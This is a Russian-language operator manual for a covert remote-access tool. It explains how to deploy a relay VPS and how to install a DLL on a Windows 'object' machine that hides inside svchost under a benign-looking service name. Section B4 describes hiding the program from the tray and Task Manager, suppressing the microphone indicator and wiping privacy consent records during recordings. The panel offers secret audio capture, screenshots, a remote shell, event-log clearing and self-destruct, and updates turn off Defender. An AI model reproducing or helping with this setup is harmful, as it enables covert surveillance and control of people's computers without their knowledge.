================================================================
A — РАЗВЁРТЫВАНИЕ VPS
================================================================

VPS запускает три компонента:
  1. nginx — TLS (HTTPS), проксирует WebSocket
  2. server.py — Python relay (127.0.0.1:8080)
  3. coturn — STUN/TURN для WebRTC

Файлы для загрузки на VPS (все рядом с deploy-vps.sh):
  deploy-vps.sh, server.py, index.html, nginx.conf,
  nginx-remote-desktop.conf, pnpext.dll*, pnpext.sys*
  (* опционально — для удалённой установки)

УСТАНОВКА:
  scp deploy-vps.sh server.py index.html nginx.conf \
      nginx-remote-desktop.conf root@VPS_IP:/tmp/rdp-deploy/
  ssh root@VPS_IP
  cd /tmp/rdp-deploy && chmod +x deploy-vps.sh
  sudo bash deploy-vps.sh

Скрипт сам установит все зависимости, настроит nginx/SSL/coturn,
создаст systemd-сервис rdp-relay и запустит всё. В конце выведет:
  Web:   https://VPS_IP/
  Host:  wss://VPS_IP:443/host (TLS)
  TURN:  turn:rdp:PASSWORD@VPS_IP:3478
  STUN:  stun:VPS_IP:3478

Сохрани TURN-пароль — он нужен в конфиге объекта.

================================================================
B — УСТАНОВКА НА ОБЪЕКТ (Windows)
================================================================

Объект — Windows DLL (pnpext.dll), загружаемая штатным
svchost.exe через механизм ServiceDll. Никакого кастомного
EXE-инжектора — стандартная схема Windows-служб.

Файлы в dist/usb/:
  pnpext.dll       — DLL объекта
  pnpext.sys       — зашифрованный конфиг (AES-256-CBC)
  install.bat      — установщик (запускает install.ps1)
  install.ps1      — PowerShell установщик
  install-cmd.bat  — batch-вариант без PowerShell
  install-web.ps1  — загрузка с VPS и установка
  uninstall.bat    — деинсталлятор
  uninstall.ps1    — PowerShell деинсталлятор

---------------------------------------------------------------
B1. Подготовка конфига
---------------------------------------------------------------

Откройте host_config.json.template и укажите:
  - server: IP вашего VPS
  - port: 443
  - use_tls: true
  - token: уникальный идентификатор кабинета
  - password: пароль кабинета
  - stun_server / turn_server: ваши значения

Зашифруйте:  python _gen_pnpext_sys.py

Или создайте конфиг через веб-клиент:
  Settings → Host Config Editor → New → заполните → Save .json

---------------------------------------------------------------
B2. Установка
---------------------------------------------------------------

Вариант 1 (USB/локально):
  Скопируйте dist/usb/ на машину.
  Правый клик install.bat → Запуск от имени администратора.

Вариант 2 (загрузка с VPS):
  Залейте pnpext.dll и pnpext.sys в /var/www/remote-desktop/files/
  на VPS (deploy-vps.sh делает это автоматически).
  Запустите install-web.ps1 на объекте.

Установщик:
  - Копирует pnpext.dll в System32
  - Копирует pnpext.sys в System32\drivers
  - Регистрирует svchost-группу PnpExtGroup
  - Создаёт службу WPnpSvc (svchost.exe -k PnpExtGroup)
  - Указывает ServiceDll = pnpext.dll
  - Запускает службу

---------------------------------------------------------------
B3. Проверка
---------------------------------------------------------------

  sc.exe qc WPnpSvc
    → BINARY_PATH_NAME: svchost.exe -k PnpExtGroup
    → START_TYPE: AUTO_START

  sc.exe query WPnpSvc | findstr STATE
    → RUNNING

  netstat -ano | findstr VPS_IP
    → 2 строки ESTABLISHED на :443 (команды + файлы)
    → +1 при активном стриме (host_stream)

---------------------------------------------------------------
B4. Особенности работы на объекте
---------------------------------------------------------------

1. НЕТ ИКОНКИ В ТРЕЕ
   Программа не создаёт иконку в системном трее. На Windows 11
   иконка микрофона при записи подавляется автоматически.
   На Windows 10 иконка микрофона может кратковременно появляться
   при начале записи — система очищает её в течение нескольких
   секунд (registry cleanup + toolbar hide).

2. НЕТ СЛЕДОВ В ПАРАМЕТРАХ КОНФИДЕНЦИАЛЬНОСТИ
   Программа автоматически очищает:
   - Параметры → Конфиденциальность → Микрофон: нет записи
     "Host Process for Windows Services" и "Last accessed"
   - Реестр HKCU/HKLM ConsentStore\microphone\NonPackaged
   - Файлы базы данных Privacy (PrivacyExperience.dat)
   - SensorPermissionState (Windows 11)
   Очистка выполняется до, во время и после каждой аудиозаписи.

3. НЕТ В СПИСКЕ ПРОЦЕССОВ
   Программа работает как DLL внутри стандартного системного
   процесса svchost.exe. В Диспетчере задач (Task Manager):
   - Вкладка "Процессы": не видна (нет отдельного процесса)
   - Вкладка "Подробности": только svchost.exe среди десятков
     таких же — неотличим от штатных служб Windows
   Имя службы WPnpSvc видно только в services.msc и через
   команду: tasklist /svc | findstr WPnpSvc

4. ЗАПИСЬ СТРИМА
   Кнопка ⏺ REC в топбаре записывает видеопоток в файл на
   стороне клиента (браузера). Запись сохраняется в выбранную
   папку (Settings → Save paths → Recordings). Формат: WebM
   (если WebRTC) или RDV (JPEG-последовательность).

================================================================
C — ВЕБ-КЛИЕНТ (панель управления)
================================================================

Откройте https://VPS_IP/ в Chrome/Edge. Введите token и password.

Панели:
  Dashboard     — метрики (RAM/CPU/GPU/Uptime), Speed Test,
                  Quick Actions, Activity Log
  Screen        — видео-стрим рабочего стола (H.264/JPEG)
  Files         — файловый менеджер (скачивание/загрузка/удаление)
  Processes     — список процессов с CPU%, Kill, Launch
  Services      — управление Windows-службами
  Terminal      — удалённый CMD
  Event Log     — журнал событий Windows (просмотр/очистка)
  Registry      — редактор реестра
  Screenshots   — автоматический захват экрана
  Audio         — запись и прослушивание микрофона
  Programs      — список установленных программ
  Settings      — конфиг, ICE-серверы, обновление объекта,
                  VPS Deploy, Threat Monitor, Self-Destruct,
                  Host Config Editor

Язык: селектор EN/RU/AZ в правом верхнем углу.

Версии: в строке состояния — Client / VPS / Host.

При подключении нескольких клиентов — оранжевый бейдж
"Другие операторы онлайн" в топбаре.

ВАЖНО: Файлы и стрим не работают одновременно. При попытке
скачать/загрузить файл во время стрима — появится
предупреждение "Сначала остановите стрим". Это сделано
для максимальной скорости: каждая функция получает 100%
канала когда активна.

---------------------------------------------------------------
C1. Настройки стрима — подробная инструкция
---------------------------------------------------------------

Параметры стрима задаются в конфигурации объекта (host_config)
и могут меняться в реальном времени через панель управления.

CODEC (кодек):
  "codec": "h264"  — H.264 аппаратный (рекомендуется)
  "codec": "jpeg"  — JPEG fallback (если H.264 не поддерживается)
  H.264 даёт в 5-10 раз меньше трафика при том же качестве.
  Используйте JPEG только если на объекте нет GPU-кодировщика.

QUALITY (качество, 1-100):
  "quality": 80  — по умолчанию
  Для H.264: влияет на QP (quantization parameter).
    80-100 = высокое качество, больше трафика
    50-79  = баланс качество/трафик (рекомендуется для удалённых)
    20-49  = низкое качество, минимум трафика
  Для JPEG: качество JPEG-сжатия напрямую.
  КОГДА МЕНЯТЬ: уменьшите если канал медленный (<1 Мбит/с)
  или видео "дёргается". Увеличьте если нужна чёткость текста.

FPS (кадров в секунду, 5-60):
  "fps": 30  — по умолчанию
  30 = плавное видео для общего использования
  15-20 = достаточно для наблюдения, экономит трафик вдвое
  5-10 = минимум, подходит для слабых каналов
  60 = максимум, нужен быстрый канал (>5 Мбит/с)
  КОГДА МЕНЯТЬ: уменьшите при медленном канале или высокой
  загрузке CPU объекта. 15 fps обычно достаточно.

SCALE (масштаб, 10-100%):
  "scale": 100  — по умолчанию (оригинальное разрешение)
  100% = полное разрешение экрана (1920x1080 → 1920x1080)
  50%  = вдвое меньше (1920x1080 → 960x540), в 4 раза меньше
         пикселей = значительно меньше трафика
  КОГДА МЕНЯТЬ: если экран объекта 4K (3840x2160) — поставьте
  50% чтобы не перегружать канал. Для 1080p обычно 70-100%.
  ВАЖНО: уменьшение scale — самый эффективный способ снизить
  трафик без потери качества деталей.

BITRATE (битрейт H.264, кбит/с):
  "bitrate": 2000  — по умолчанию (2 Мбит/с)
  500-1000  = экономия, подходит для текстовых экранов
  2000-3000 = баланс (рекомендуется)
  5000+     = высокое качество, нужен быстрый канал
  Влияет ТОЛЬКО на H.264, для JPEG не используется.
  КОГДА МЕНЯТЬ: если видео "размытое" при движении — увеличьте.
  Если "дёргается" — уменьшите (канал не справляется).

WEBRTC / ICE СЕРВЕРЫ:
  В Settings → WebRTC ICE Servers:
  - STUN server: stun:VPS_IP:3478 (обязателен для WebRTC)
  - TURN server: turn:rdp:PASSWORD@VPS_IP:3478 (для NAT traversal)
  - Enable WebRTC: включает UDP-транспорт (минимальная задержка)
  - Force TURN relay: принудительно через TURN (если прямой
    UDP заблокирован файрволом)
  Без WebRTC видео идёт по WebSocket (TCP) — выше задержка,
  но работает через любой firewall.
  КОГДА МЕНЯТЬ: если видео не запускается — проверьте coturn
  на VPS. Если не помогает — отключите WebRTC (JPEG fallback).

РЕКОМЕНДУЕМЫЕ ПРОФИЛИ:

  Быстрый канал (>5 Мбит/с):
    codec=h264, quality=80, fps=30, scale=100, bitrate=3000

  Средний канал (1-5 Мбит/с):
    codec=h264, quality=60, fps=20, scale=70, bitrate=2000

  Медленный канал (<1 Мбит/с):
    codec=h264, quality=40, fps=10, scale=50, bitrate=800

  Минимальный (мобильный интернет):
    codec=jpeg, quality=30, fps=5, scale=30

Все параметры можно менять в реальном времени через слайдеры
в панели стрима (без перезапуска). Также через Host Config
Editor для постоянного сохранения.

================================================================
D — НЕСКОЛЬКО КАБИНЕТОВ
================================================================

Один VPS обслуживает до 100 комнат (RDP_MAX_ROOMS).

Каждый кабинет = уникальная пара (token, password).
Комнаты создаются автоматически при первом подключении объекта.
Данные изолированы: скриншоты, аудио, файлы — по комнатам.

Для нового кабинета:
  1. Задайте уникальный token и password
  2. Создайте pnpext.sys (через _gen_pnpext_sys.py или UI)
  3. Установите на объект с этим pnpext.sys
  4. В браузере подключитесь с тем же token/password

НИКОГДА не используйте одинаковый token для разных объектов.

================================================================
E — ОБНОВЛЕНИЕ
================================================================

Через веб-клиент (Settings → VPS Deploy):
  Выберите файлы → Upload All 3 → Restart server.py

Или через SSH:
  scp index.html root@VPS:/var/www/remote-desktop/
  scp server.py root@VPS:/opt/remotedesk/
  ssh root@VPS "systemctl restart rdp-relay"

Обновление DLL объекта:
  Settings → Remote Host Update → URL DLL → Update Host
  Порядок: Загрузка → Defender off → Стоп службы →
           Замена DLL → Старт службы → Defender on → Готово
  Объект остаётся онлайн до шага "Стоп службы".

Перезапуск объекта: Settings → ↻ Restart

Конфиг объекта (без переустановки):
  Settings → Host Config Editor → Load → Edit → Save to host

Версии синхронизируются автоматически при сборке
(_bump_version.py обновляет host.h, index.html, server.py).

================================================================
F — КОМАНДЫ VPS
================================================================

  systemctl status rdp-relay      # статус relay
  systemctl status coturn         # статус TURN
  systemctl restart rdp-relay     # перезапуск relay
  systemctl reload nginx          # перезагрузка nginx
  journalctl -u rdp-relay -f      # логи relay
  nginx -t                        # проверка конфига nginx

================================================================
G — ДИАГНОСТИКА
================================================================

Объект не подключается:
  - Проверьте port:443, use_tls:true в конфиге
  - netstat -ano | findstr VPS_IP (ожидайте 2+ ESTABLISHED)
  - Проверьте firewall на объекте

Auth failed:
  - Несовпадение token/password. Объект уходит в cooldown
    5 минут. Исправьте конфиг и подождите.

Стрим не работает:
  - Проверьте coturn: systemctl status coturn
  - Проверьте ICE-серверы в конфиге объекта

Файлы медленно скачиваются:
  - Нормальная скорость: 1.5-2.5 МБ/с через TLS
  - При нескольких клиентах скорость делится (round-robin)
  - Используйте один браузер для максимальной скорости

Логи объекта:
  Файловое логирование отключено. Для отладки используйте
  EXE-сборку из консоли.
